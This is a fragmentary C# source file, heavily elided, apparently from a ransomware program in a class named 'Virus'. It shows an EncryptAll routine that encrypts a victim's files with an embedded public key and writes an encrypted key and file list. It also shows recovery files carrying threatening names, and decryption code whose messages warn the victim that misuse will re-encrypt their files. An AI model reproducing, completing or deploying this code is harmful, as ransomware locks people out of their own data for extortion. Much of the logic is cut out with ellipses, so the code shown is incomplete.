...
namespace Virus
{
    ...
    internal class Virus
    {
        ...
        public static KeyPair publicKey = new(DataTypeStoreLib.Read.TopLevelRegion(
            ...
            .Split(';')
            )[0]); //Built in public key that matches the private key from Keypair.txt
        ...
        public static readonly string defaultKey = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"recoveryKey.txt");
        public static readonly string defaultDecryptedKey = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"decryptedKey.txt");
    ...
    1;
            ...
            if (result.Count != 0)
            {
                Console.WriteLine("Creating recovery files...");
                ...
                File.WriteAllText(defaultDecryptedKey, DataTypeStoreLib.Automatic.Object(key, "DONT_DELETE_THIS_FILE_OR_ALL_YOUR_ENCRYPTED_FILES_WILL_BE_LOST_FOREVER!").RegionSaveString);
                Console.Clear();
                result.ForEach(x => Console.WriteLine(x.path));

                Console.WriteLine("\nSorry,\nwe were not able to decrypt some files due to windows limitations.");
                Console.WriteLine($"There are some things you could try to troubleshoot:\n1. Run this program again as administrator\n2. Restart your computer and run this program again\nPlease only start this software by drag-and-dropping the file {defaultDecryptedKey} onto the executable or it will encrypt your files again.");
                Console.ReadKey();
                return;
            }
        ...
        public static BigInteger EncryptAll()
        {
            ...
            Task.WaitAll(tasks.ToArray());
            Console.WriteLine("Generating files necessary for decryption...");
            List<EncryptedFiles> result = new();
            ...
            Console.WriteLine("\tGenerating encrypted key");
            ...
            Console.WriteLine("\tGenerating encrypted files list");
            File.WriteAllText(defaultFiles, DataTypeStoreLib.Automatic.Object(result, "DONT_DELETE_THIS_FILE_OR_ALL_YOUR_ENCRYPTED_FILES_WILL_BE_LOST_FOREVER!").RegionSaveString);
            Console.WriteLine("Done");
        ...
        public static List<EncryptedFiles> DecryptFiles(List<EncryptedFiles> files, byte[] key)
        {
            ...
            foreach (var file in files)
            {
                try
                {
                    ...
                    _ = currentFile.Read(fileContent, 0, fileContent.Length);
                ...
                {
                    Console.WriteLine("Failed overwriting file, trying to create copy...");
                    try
                    {
                        byte[] fileContent = File.ReadAllBytes(file.path);
                        List<byte> decrypted = Crypting.Decrypt(fileContent, key).ToList();
                        while (decrypted.Count > file.originalLenght)
                        {
                            decrypted.RemoveRange((int)file.originalLenght, decrypted.Count - (int)file.originalLenght);
                        }
                        File.WriteAllBytes(file.path + ".DecryptedBackup", decrypted.ToArray());
                    }
                    catch
                    {
                        if (!File.Exists(file.path))
                        {
                            Console.WriteLine("Can't decrypt file because it was deleted or renamed.");
                        }
                        else
                        {
